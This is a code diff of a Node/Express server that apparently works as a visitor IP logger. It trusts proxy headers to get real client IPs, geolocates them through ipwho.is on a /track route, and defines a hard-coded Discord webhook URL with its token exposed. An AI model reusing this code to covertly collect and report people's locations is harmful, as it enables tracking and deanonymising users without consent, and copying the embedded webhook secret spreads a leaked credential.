@@ -6,10 +6,10 @@ const PORT = process.env.PORT || 3000;
 
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1511274000641167400/K-dYT4j9-0dWuvQJ4yKMLR7PWiTEXQ7FpXQSxoFN8pEtER5yyVHpGxvPb0SLkEy4uqMO";
 
-// IMPORTANT: needed for real IPs on hosting platforms (Render, etc.)
+// REQUIRED for real IPs on hosting platforms (Render, etc.)
 app.set("trust proxy", true);
 
-// Serve index.html from same folder as server.js
+// Serve index.html from same folder
 app.get("/", (req, res) => {
     res.sendFile("index.html", { root: process.cwd() });
 });
@@ -33,7 +33,7 @@ app.get("/track", async (req, res) => {
     let city = "Unknown";
     let country = "Unknown";
 
-    // Ignore local/testing IPs
+    // Detect local IPs
     const isLocal =
         ip === "::1" ||
         ip === "127.0.0.1" ||
@@ -41,13 +41,20 @@ app.get("/track", async (req, res) => {
         ip.startsWith("10.") ||
         ip.startsWith("172.");
 
-    if (!isLocal) {
+    if (!isLocal && ip) {
         try {
-            const geo = await fetch(`https://ipapi.co/${ip}/json/`);
-            const data = await geo.json();
+            // ✅ MORE RELIABLE API
+            const geoRes = await fetch(`https://ipwho.is/${ip}`);
+            const data = await geoRes.json();
 
-            city = data.city || "Unknown";
-            country = data.country_name || "Unknown";
+            if (data.success) {
+                city = data.city || "Unknown";
+                country = data.country || "Unknown";
+            } else {
+                // fallback if API fails
+                city = "Unknown";
+                country = "Unknown";
+            }
         } catch (err) {
             console.error("Geo lookup failed:", err);
         }
